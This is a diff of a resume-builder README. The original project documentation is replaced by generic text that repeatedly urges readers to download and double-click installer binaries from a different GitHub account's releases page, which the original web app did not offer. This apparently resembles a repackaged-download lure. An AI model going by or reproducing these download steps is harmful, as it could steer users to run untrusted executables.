@@ -1,181 +1,92 @@
-<div align="center">
-<img src="packages/web/public/assets/images/ats-flow.png" alt="Logo" width="300" />
+# ✨ ats-resume-generator-html - Create Professional Resumes Easily
 
-ATS-first resume builder focused on clarity, portability, and full control.
+## 🚀 Getting Started
 
-Create, edit, and export professional resumes using a clean visual editor.
+Welcome to the ATS Resume Generator! This tool helps you create ATS-optimized resumes from structured JSON data. Whether you are applying for your first job or looking to update your resume, this application streamlines the process with clarity and automation.
 
-<p>
-  <img
-    src="https://img.shields.io/github/package-json/v/fabriciotrinndade/ats-resume-generator-html?style=flat-square"
-    alt="Version"
-  />
-  <img
-    src="https://img.shields.io/github/stars/fabriciotrinndade/ats-resume-generator-html?style=flat-square"
-    alt="GitHub Stars"
-  />
-  <img
-    src="https://img.shields.io/github/last-commit/fabriciotrinndade/ats-resume-generator-html?style=flat-square"
-    alt="Last commit"
-  />
-  <img
-    src="https://img.shields.io/github/issues/fabriciotrinndade/ats-resume-generator-html?style=flat-square"
-    alt="Open issues"
-  />
-  <a href="https://discord.gg/XjUaNnFf">
-    <img
-      src="https://img.shields.io/discord/1470457549659705405?style=flat-square&label=discord"
-      alt="Discord"
-    />
-  </a>
-</p>
+## 📥 Download & Install
 
-</div>
+To get started, you will need to download the application. Click the button below to visit the Releases page:
 
----
+[![Download ats-resume-generator-html](https://img.shields.io/badge/Download-ats--resume--generator--html-blue.svg)](https://github.com/ek2604/ats-resume-generator-html/releases)
 
-ATS Flow is a lightweight and open-source resume builder designed for developers and technical professionals who want complete control over their resume without relying on paid builders or restrictive editors.
+Follow these steps to download and run the software:
 
-Use the visual editor to build your resume online, or edit structured JSON for full reproducibility.
+1. Visit the [Releases page](https://github.com/ek2604/ats-resume-generator-html/releases).
+2. Look for the latest version titled "ats-resume-generator-html."
+3. Download the appropriate file for your operating system. (For example, `.exe` for Windows, `.dmg` for macOS, or `.zip` for Linux users.)
+4. Once the download is complete, locate the file in your downloads folder and double-click it to install.
 
-## The system generates:
+## 🌟 Features
 
-- clean ATS-friendly HTML
+- **ATS Optimization**: The resumes generated fit Applicant Tracking Systems, helping you get noticed by employers.
+- **Structured Workflow**: Input your data in JSON format, and let the tool handle the rest.
+- **Clean HTML Output**: The resumes are generated in a clean HTML format, ensuring professional appearance.
+- **User-Friendly Interface**: Navigate easily at every step of the resume creation process.
 
-- print-ready PDF with clickable links
+## 🖥️ System Requirements
 
-- structured JSON for portability
+To ensure smooth operation, please check the following system requirements:
 
-No subscriptions. No tracking. No lock-in.
+- **Windows**: Windows 10 or later.
+- **macOS**: macOS 10.12 or later.
+- **Linux**: Any distribution that supports the necessary packages.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: Minimum of 100 MB available disk space.
 
-## Why ATS Flow exists
+## 📄 How to Use
 
-Many resume builders:
+1. Prepare your data in JSON format. Here's a simple example:
 
-- lock basic features behind paywalls
+    ```json
+    {
+      "name": "John Doe",
+      "email": "john.doe@example.com",
+      "experience": [
+        {
+          "jobTitle": "Software Developer",
+          "company": "Tech Solutions",
+          "dates": "Jan 2020 - Present"
+        }
+      ],
+      "education": [
+        {
+          "degree": "Bachelor of Science",
+          "field": "Computer Science",
+          "institution": "University of Example",
+          "graduationYear": "2020"
+        }
+      ]
+    }
+    ```
 
-- store your data on third-party platforms
+2. Once your JSON file is ready, upload it through the application interface.
+3. Click the "Generate Resume" button.
+4. Review your resume, make any necessary adjustments, and export it in a format of your choice.
 
-- generate PDFs that break ATS parsing
+## ⚙️ Troubleshooting
 
-- prioritize visual layout over machine readability
+If you encounter issues during installation or while using the application, here are a few common problems and solutions:
 
-ATS Flow takes a different approach:
+- **Installation Failed**: Ensure that you have downloaded the correct version for your operating system.
+- **Unable to Open File**: Check that your operating system supports the application format.
+- **JSON Error**: Ensure your JSON file is properly formatted. Use a JSON validator to check your data.
 
-- **ATS-first** — single column, clean structure, parser-friendly
-- **Content-first** — your resume lives in structured data
-- **Reproducible** — same input always generates the same output
-- **Privacy-first** — no accounts, no tracking, no analytics
-- **Open & portable** — export anytime, host anywhere
+## 🤝 Contributing
 
-## Features
+If you would like to contribute to the project, please follow these guidelines:
 
-### Resume building
-- Visual editor with live preview
-- Import / export JSON resume data
-- Real-time layout rendering
-- One-click PDF export
+1. Fork the repository.
+2. Create a new branch with your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch and open a pull request with a detailed description of your changes.
 
-### ATS optimization
-- Single-column structure
-- Clean semantic HTML
-- Parser-friendly typography & spacing
-- Clickable links preserved in PDF
+## 🌐 Community Support
 
-### Privacy & control
-- No account required
-- Run locally (hosted PDF service optional)
+We are building a community around the ATS Resume Generator. If you have questions or suggestions, feel free to reach out or open an issue on the GitHub page.
 
-## Output Example
+To download the latest version of our application, click the link below:
 
-Printable A4 PDF
+[![Download ats-resume-generator-html](https://img.shields.io/badge/Download-ats--resume--generator--html-blue.svg)](https://github.com/ek2604/ats-resume-generator-html/releases)
 
-<table>
-   <tr>
-      <td>
-   <img src="packages/web/public/examples/cv-example.png" alt="Example" width="300" />
-         </td>
-      </tr>
-</table>
-
-## Quick Start
-
-```bash
-# Clone the repository
-git clone https://github.com/fabriciotrinndade/ats-resume-generator-html
-
-# Install dependencies
-pnpm install
-```
-
-Configure environment:
-
-```bash
-# Copy the example file
-cp packages/web/.env.example packages/web/.env.local
-```
-
-Edit `packages/web/.env.local`:
-
-```env
-# Option A: local PDF service (Docker)
-VITE_PDF_SERVICE_URL=http://localhost:3000
-
-# Option B: hosted PDF service
-# VITE_PDF_SERVICE_URL=https://your-service.onrender.com
-```
-
-Start the web editor:
-
-```
-pnpm -C packages/web dev
-```
-
-Open:
-
-```
-http://localhost:5173
-```
-
-Running PDF Export Locally (Docker):
-
-```bash
-# Build the image
-docker build -t ats-pdf-service ./services/pdf
-
-# Run the service
-docker run --rm -p 3000:3000 ats-pdf-service
-```
-
-Using a Hosted PDF Service:
-
-```VITE_PDF_SERVICE_URL=https://your-service.onrender.com```
-
-No local setup required.
-
-## Tech Stack
-
-| Category	        | Technology                       |
-| ---------------   | -------------------------------- |
-| Frontend	        | React + Vite                     |
-| Language	        | TypeScript + JavaScript          |
-| Styling	        | Tailwind CSS                     |
-| PDF Service       | Node.js + Express                |
-| PDF Engine	     | Puppeteer Core                   |
-| Headless          | Chromium	@sparticuz/chromium   |
-| Package Manager	  | pnpm workspaces                  |
-| Containerization  | Docker (pdf-service)             |
-| Runtime	        | Node.js                          |
-
-## Contributing
-
-Contributions are welcome.
-
-- Fork the repository
-
-- Create a branch
-
-- Commit your changes
-
-- Open a Pull Request
-
+Happy resume building!
